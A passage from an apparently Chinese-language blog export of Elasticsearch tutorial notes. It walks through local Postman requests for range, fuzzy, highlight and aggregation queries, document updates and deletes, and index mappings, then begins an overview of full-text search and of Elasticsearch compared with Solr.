查询允许以下字符：</p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>gt</td><td>大于&gt;</td></tr><tr><td>gte</td><td>大于等于&gt;&#x3D;</td></tr><tr><td>lt</td><td>小于&lt;</td></tr><tr><td>lte</td><td>小于等于&lt;&#x3D;</td></tr></tbody></table><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/student/_search">http://127.0.0.1:9200/student/_search</a></p><p>请求体：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;query&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">        <span class="string">&quot;range&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">            <span class="string">&quot;age&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                <span class="string">&quot;gte&quot;</span><span class="string">:30</span>,</span><br><span class="line">                <span class="string">&quot;lte&quot;</span><span class="string">:35</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108000012.png"></p><hr><h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p>返回包含与搜索字词相似的字词的文档。</p><p>编辑距离是将一个术语转换为另一个术语所需的一个字符更改的次数。这些更改可以包括：</p><ul><li>更改字符（box → fox）</li></ul><ul><li>删除字符（black → lack）</li><li>插入字符（sic → sick） </li><li>转置两个相邻字符（act → cat）</li></ul><p>为了找到相似的术语，fuzzy 查询会在指定的编辑距离内创建一组搜索词的所有可能的变体或扩展。然后查询返回每个扩展的完全匹配。</p><p>通过 fuzziness 修改编辑距离。一般使用默认值 AUTO，根据术语的长度生成编辑距离。</p><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/student/_search">http://127.0.0.1:9200/student/_search</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;query&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">        <span class="string">&quot;fuzzy&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">            <span class="string">&quot;title&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                <span class="string">&quot;value&quot;</span><span class="string">:&quot;zhangsan&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108210224.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108222458.png"></p><hr><h3 id="高亮查询"><a href="#高亮查询" class="headerlink" title="高亮查询"></a>高亮查询</h3><p>在进行关键字搜索时，搜索出的内容中的关键字会显示不同的颜色，称之为高亮。</p><p>Elasticsearch 可以对查询内容中的关键字部分，进行标签和样式(高亮)的设置。</p><p>在使用 match 查询的同时，加上一个 highlight 属性：</p><ul><li><p>pre_tags：前置标签</p></li><li><p>post_tags：后置标签</p></li><li><p>fields：需要高亮的字段</p></li><li><p>title：这里声明 title 字段需要高亮，后面可以为这个字段设置特有配置，也可以空</p></li></ul><p>在 Postman 中，向 ES 服务器发 GET 请求 ：<a href="http://127.0.0.1:9200/student/_search">http://127.0.0.1:9200/student/_search</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;query&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">        <span class="string">&quot;match&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span><span class="string">:&quot;zhangsan&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;highlight&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">        <span class="string">&quot;pre_tags&quot;</span><span class="string">:&quot;&lt;font</span> <span class="string">color=&#x27;red&#x27;&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_tags&quot;</span><span class="string">:&quot;&lt;/font&gt;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fields&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span><span class="string">:</span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108230318.png"></p><hr><h3 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h3><p>聚合允许使用者对 es 文档进行统计分析，类似与关系型数据库中的 group by，当然还有很</p><p>多其他的聚合，例如取最大值、平均值等等。</p><p>对某个字段取最大值 max：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108232818.png"></p><p>对某个字段取最小值 min：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108232914.png"></p><p>对某个字段求和 sum：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108233007.png"></p><p>对某个字段取平均值 avg：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108233156.png"></p><p>对某个字段的值进行去重之后再取总数 count：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108233307.png"></p><p>stats 聚合，对某个字段一次性返回 count，max，min，avg 和 sum 五个指标：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108233515.png"></p><hr><h3 id="桶聚合查询"><a href="#桶聚合查询" class="headerlink" title="桶聚合查询"></a>桶聚合查询</h3><p>桶聚和相当于 sql 中的 group by 语句</p><p>terms 聚合，分组统计：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211108235019.png"></p><hr><h2 id="修改文档"><a href="#修改文档" class="headerlink" title="修改文档"></a>修改文档</h2><p>和新增文档一样，输入相同的 URL 地址请求，如果请求体变化，会将原有的数据内容覆盖</p><p>在 Postman 中，向 ES 服务器发 <strong>POST</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping**/_doc/1">http://127.0.0.1:9200/shopping**/_doc/1</a>**</p><p>请求体内容为: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;title&quot;</span><span class="string">:&quot;华为P50&quot;</span>,</span><br><span class="line"> <span class="string">&quot;category&quot;</span><span class="string">:&quot;华为&quot;</span>,</span><br><span class="line"> <span class="string">&quot;images&quot;</span><span class="string">:&quot;https://www-file.huawei.com/-/media/corporate/images/home/logo/huawei_logo.png&quot;</span>,</span><br><span class="line"> <span class="string">&quot;price&quot;</span><span class="string">:5999.00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104080217.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;_index&quot;:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_type&quot;:</span> <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_id&quot;:</span> <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_version&quot;</span><span class="string">【版本】:</span> <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span><span class="string">【结果】:</span> <span class="string">&quot;updated&quot;</span>, <span class="comment"># updated 表示数据被更新</span></span><br><span class="line">    <span class="attr">&quot;_shards&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;total&quot;:</span> <span class="number">2</span>,</span><br><span class="line">        <span class="attr">&quot;successful&quot;:</span> <span class="number">1</span>,</span><br><span class="line">        <span class="attr">&quot;failed&quot;:</span> <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;_seq_no&quot;:</span> <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;_primary_term&quot;:</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="修改字段"><a href="#修改字段" class="headerlink" title="修改字段"></a>修改字段</h2><p>修改数据时，也可以只修改某一给条数据的局部信息</p><p>在 Postman 中，向 ES 服务器发 <strong>POST</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping/**_update/1">http://127.0.0.1:9200/shopping/**_update/1</a>**</p><p>请求体内容为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line"> <span class="attr">&quot;doc&quot;:</span> &#123;</span><br><span class="line"> <span class="string">&quot;price&quot;</span><span class="string">:3000.00</span></span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105000454.png"></p><p>根据唯一性标识，查询文档数据，文档数据已经更新：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105000517.png"></p><hr><h2 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h2><p>删除一个文档不会立即从磁盘上移除，它只是被标记成已删除（逻辑删除）。</p><p>在 Postman 中，向 ES 服务器发 <strong>DELETE</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping**/_doc/1">http://127.0.0.1:9200/shopping**/_doc/1</a>**</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105000802.png"></p><p>删除后再查询当前文档信息：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105000842.png"></p><p>如果删除一个并不存在的文档：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105000812.png"></p><hr><h2 id="条件删除文档"><a href="#条件删除文档" class="headerlink" title="条件删除文档"></a>条件删除文档</h2><p>一般删除数据都是根据文档的唯一性标识进行删除，实际操作时，也可以根据条件对多条数据进行删除</p><p>向 ES 服务器发 <strong>POST</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping**/_delete_by_query">http://127.0.0.1:9200/shopping**/_delete_by_query</a>**</p><p>请求体内容为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;query&quot;</span><span class="string">:</span>&#123;</span><br><span class="line"> <span class="string">&quot;match&quot;</span><span class="string">:</span>&#123;</span><br><span class="line"> <span class="string">&quot;price&quot;</span><span class="string">:4000.00</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105223604.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;took&quot;</span><span class="string">【耗时】:</span> <span class="number">38</span>,</span><br><span class="line">    <span class="string">&quot;timed_out&quot;</span><span class="string">【是否超时】:</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;total&quot;</span><span class="string">【总数】:</span> <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;deleted&quot;</span><span class="string">【删除数量】:</span> <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;batches&quot;:</span> <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;version_conflicts&quot;:</span> <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;noops&quot;:</span> <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;retries&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;bulk&quot;:</span> <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;search&quot;:</span> <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;throttled_millis&quot;:</span> <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;requests_per_second&quot;:</span> <span class="number">-1.0</span>,</span><br><span class="line">    <span class="attr">&quot;throttled_until_millis&quot;:</span> <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;failures&quot;:</span> []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="映射操作"><a href="#映射操作" class="headerlink" title="映射操作"></a>映射操作</h1><p>有了索引库，等于有了数据库中的 database。</p><p>接下来就需要建索引库(index)中的映射了，类似于数据库(database)中的表结构(table)。创建数据库表需要设置字段名称，类型，长度，约束等；索引库也一样，需要知道这个类型下有哪些字段，每个字段有哪些约束信息，这就叫做映射(mapping)。</p><h2 id="创建映射"><a href="#创建映射" class="headerlink" title="创建映射"></a>创建映射</h2><p>先创建索引，在 Postman 中，向 ES 服务器发 <strong>PUT</strong> 请求 ：<a href="http://127.0.0.1:9200/student">http://127.0.0.1:9200/student</a></p><p>再创建映射，在 Postman 中，向 ES 服务器发 <strong>PUT</strong> 请求 ：<a href="http://127.0.0.1:9200/student**/_mapping">http://127.0.0.1:9200/student**/_mapping</a>**</p><p>请求体内容为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">&quot;properties&quot;:</span> &#123;</span><br><span class="line">     <span class="string">&quot;name&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">         <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;text&quot;</span>,</span><br><span class="line">         <span class="attr">&quot;index&quot;:</span> <span class="literal">true</span></span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">&quot;sex&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">         <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;text&quot;</span>,</span><br><span class="line">         <span class="attr">&quot;index&quot;:</span> <span class="literal">false</span></span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">&quot;age&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">         <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;long&quot;</span>,</span><br><span class="line">         <span class="attr">&quot;index&quot;:</span> <span class="literal">false</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107132225.png"></p><p>映射数据说明：</p><ul><li><p>字段名：任意填写，下面指定许多属性，例如：title、subtitle、images、price</p></li><li><p>type：类型，Elasticsearch 中支持的数据类型非常丰富，说几个关键的：</p><ul><li>String 类型，又分两种：<ul><li>text：可分词</li><li>keyword：不可分词，数据会作为完整字段进行匹配，全词匹配</li></ul></li><li>Numerical：数值类型，分两类<ul><li>基本数据类型：long、integer、short、byte、double、float、half_float</li><li>浮点数的高精度类型：scaled_float</li></ul></li><li>Date：日期类型</li><li>Array：数组类型</li><li>Object：对象</li></ul></li><li><p>index：是否索引，默认为 true，也就是说你不进行任何配置，所有字段都会被索引。</p><ul><li><p>true：字段会被索引，则可以用来进行搜索</p></li><li><p>false：字段不会被索引，不能用来搜索</p></li></ul></li><li><p>store：是否将数据进行独立存储，默认为 false，原始的文本会存储在 _source 里面，默认情况下其他提取出来的字段都不是独立存储的，是从 _source 里面提取出来的。当然你也可以独立的存储某个字段，只要设置”store”: true 即可，获取独立存储的字段要比从 _source 中解析快得多，但是也会占用更多的空间，所以要根据实际业务需求来设置。</p></li><li><p>analyzer：分词器，这里的 ik_max_word 即使用 ik 分词器，后面会有专门的章节学习</p></li></ul><hr><h2 id="查看映射"><a href="#查看映射" class="headerlink" title="查看映射"></a>查看映射</h2><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/student**/_mapping">http://127.0.0.1:9200/student**/_mapping</a>**</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107160909.png"></p><hr><h2 id="索引映射关联"><a href="#索引映射关联" class="headerlink" title="索引映射关联"></a>索引映射关联</h2><p>在 Postman 中，向 ES 服务器发 <strong>PUT</strong> 请求 ：<a href="http://127.0.0.1:9200/student2">http://127.0.0.1:9200/student2</a></p><p>请求体：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">&quot;settings&quot;:</span> &#123;&#125;,</span><br><span class="line"> <span class="attr">&quot;mappings&quot;:</span> &#123;</span><br><span class="line">     <span class="attr">&quot;properties&quot;:</span> &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">             <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;text&quot;</span>,</span><br><span class="line">             <span class="attr">&quot;index&quot;:</span> <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;sex&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">             <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;text&quot;</span>,</span><br><span class="line">             <span class="attr">&quot;index&quot;:</span> <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;age&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">             <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;long&quot;</span>,</span><br><span class="line">             <span class="attr">&quot;index&quot;:</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107161507.png"></p><p>索引需为新建索引，否则会报如下错误：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;error&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;root_cause&quot;:</span> [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;resource_already_exists_exception&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;reason&quot;:</span> <span class="string">&quot;index [student/L5eMwGFvSFS1G3iFfVUaZQ] already exists&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;index_uuid&quot;:</span> <span class="string">&quot;L5eMwGFvSFS1G3iFfVUaZQ&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;index&quot;:</span> <span class="string">&quot;student&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;resource_already_exists_exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;reason&quot;:</span> <span class="string">&quot;index [student/L5eMwGFvSFS1G3iFfVUaZQ] already exists&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;index_uuid&quot;:</span> <span class="string">&quot;L5eMwGFvSFS1G3iFfVUaZQ&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;index&quot;:</span> <span class="string">&quot;student&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;status&quot;:</span> <span class="number">400</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch概述</title>
      <link href="/posts/1260/"/>
      <url>/posts/1260/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：尚硅谷的Elasticsearch 7.8.0版本 <a href="https://www.bilibili.com/video/BV1hh411D7sb?p=1">https://www.bilibili.com/video/BV1hh411D7sb?p=1</a></p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>​       搜索引擎的核心其实就是查询，在互联网当中，我们的查询的信息主要包括文章、视频、图片、文本信息等等。那传统意义上根据数据的格式我们会将数据分为三个大类：结构化数据、非结构化数据，半结构数据。</p><p><strong>结构化数据：</strong></p><p>我们一般会用特定的表结构来组织和管理数据，它一般表现为二维表结构，比如我们用户数据，其中包含了用户姓名，年龄，身份证信息，这些信息是有关系的，所以可以保存到关系型数据库当中，比如MySQL、Oracle当中，并可以通过搜索语句来进行查询，为了提高效率，我们甚至可以采用一些索引的方式来优化它，结构化数据的优点就是方便管理和查询，但是它的缺点是扩展结构是很难的，当我们已经有了现有的结构之后我们再去扩展，其实很不方便。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211031231103.png"></p><hr><p><strong>非结构化数据：</strong></p><p>所谓的非结构化数据其实就是我们无法用二维表结构来表现的数据，比方说服务器日志，通讯记录，工作文档，包括报表，还有视频等。这些数据的维度广而且数据量大，所以数据存储和查询的成本是非常大的，往往需要专业的人员和大量的统计模型来进行处理，一般将数据保存到非关系型数据库当中，比如MongoDB、 redis，一般都是以KV结构来进行保存的，通过KEY来查询我们的数据，相对来说比较快。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211031231141.png"></p><hr><p><strong>半结构化数据：</strong></p><p>半结构化数据则是数据的结构和内容混在一起，没有明显的区分。比如XML、HTML这样的文档，这样的数据一般也都是保存到MongoDB、 redis、HBase当中。但它的缺点就在于查询它的内容不是很容易。生活中很多场景下，我们查找的对象并非都是关系型结构化的信息，我们无法像数据库模糊查询那样模糊匹配，更不可能遍历所有的内容做匹配，毕竟查询的目的是为了快速找到你想要的信息。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211031231207.png"></p><blockquote><p>所以如何查询半结构化数据以及非结构化数据当中的内容，并且准确的查询是非常重要的。Elasticsearch软件J就是为了解决这样问题所产生的软件。</p></blockquote><h2 id="Elasticsearch是什么"><a href="#Elasticsearch是什么" class="headerlink" title="Elasticsearch是什么"></a>Elasticsearch是什么</h2><p>​        The Elastic Stack，包括 Elasticsearch、Kibana、Beats 和 Logstash（这些项目组合在一起的技术栈也称为 ELK Stack）。能够安全可靠地获取任何来源、任何格式的数据，然后实时地对数据进行搜索、分析和可视化。</p><ul><li>Elaticsearch简称为 ES，ES 是一个<strong>高扩展的分布式、Restful风格的全文搜索和数据分析引擎，</strong>是整个 Elastic Stack 技术栈的核心。它可以近乎实时的<strong>存储、检索</strong>数据；本身扩展性很好，可以扩展到上百台服务器，处理 PB 级别的数据。</li><li>Beats 和 Logstash是用于采集和传输数据的项目。</li><li>Kibana用于展示数据的项目(Dashboard面板)。</li></ul><p>​</p><h2 id="全文搜索引擎"><a href="#全文搜索引擎" class="headerlink" title="全文搜索引擎"></a>全文搜索引擎</h2><p>Google，百度类的网站搜索，它们都是根据网页中的关键字生成索引，我们在搜索的时候输入关键字，它们会将该关键字即索引匹配到的所有网页返回；还有常见的项目中应用日志的搜索等等。对于这些非结构化的数据文本，关系型数据库搜索不是能很好的支持。一般传统数据库，全文检索都实现的很鸡肋，因此一般也没人用数据库存文本字段。进行全文检索需要扫描整个表，如果数据量大的话即使对 SQL 的语法优化，也收效甚微。建立了索引，但是维护起来也很麻烦，对于 insert 和 update 操作都会重新构建索引。</p><p>基于以上原因可以分析得出，在一些生产环境中，使用常规的搜索方式，性能是非常差的：</p><ul><li><p>搜索的数据对象是大量的非结构化的文本数据。</p></li><li><p>文件记录量达到数十万或数百万个甚至更多。</p></li><li><p>支持大量基于交互式文本的查询。</p></li><li><p>需求非常灵活的全文搜索查询。</p></li><li><p>对高度相关的搜索结果的有特殊需求，但是没有可用的关系数据库可以满足。</p></li><li><p>对不同记录类型、非文本数据操作或安全事务处理的需求相对较少的情况。</p></li></ul><p>为了解决结构化数据搜索和非结构化数据搜索性能问题，我们就需要专业，健壮，强大的全文搜索引擎。</p><p>这里说到的全文搜索引擎指的是目前广泛应用的主流搜索引擎。它的工作原理是计算机索引程序通过扫描文章中的每一个词，对每一个词建立一个索引，指明该词在文章中出现的次数和位置，当用户查询时，检索程序就根据事先建立的索引进行查找，并将查找的结果反馈给用户的检索方式。这个过程类似于通过字典中的检索字表查字的过程。</p><hr><h2 id="Elasticsearch-And-Solr"><a href="#Elasticsearch-And-Solr" class="headerlink" title="Elasticsearch And Solr"></a>Elasticsearch And Solr</h2><p>Lucene 是 Apache 软件基金会 Jakarta 项目组的一个子项目，提供了一个简单却强大的应用程式接口，能够做全文索引和搜寻。在 Java 开发环境里 Lucene 是一个成熟的免费开源工具。就其本身而言，Lucene 是当前以及最近几年最受欢迎的免费 Java 信息检索程序库。但 Lucene 只是一个提供全文搜索功能类库的核心工具包，而真正使用它还需要一个完善的服务框架搭建起来进行应用。</p><p>目前市面上流行的搜索引擎软件，主流的就两款：<strong>Elasticsearch</strong> 和 <strong>Solr</strong>,这两款都是基于 Lucene 搭建的，可以独立部署启动的搜索引擎服务软件。由于内核相同，所以两者除了服务器安装、部署、管理、集群以外，对于数据的操作 修改、添加、保存、查询等等都十分类似。</p><p>在使用过程中，一般都会将 Elasticsearch 和 Solr 这两个软件对比，然后进行选型。这两个搜索引擎都是流行的，先进的的开源搜索引擎。它们都是围绕核心底层搜索库 - Lucene构建的 - 但它们又是不同的。像所有东西一样，每个都有其优点和缺点：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211101000002.png"></p><h2 id="Elasticsearch-Or-Solr"><a href="#Elasticsearch-Or-Solr" class="headerlink" 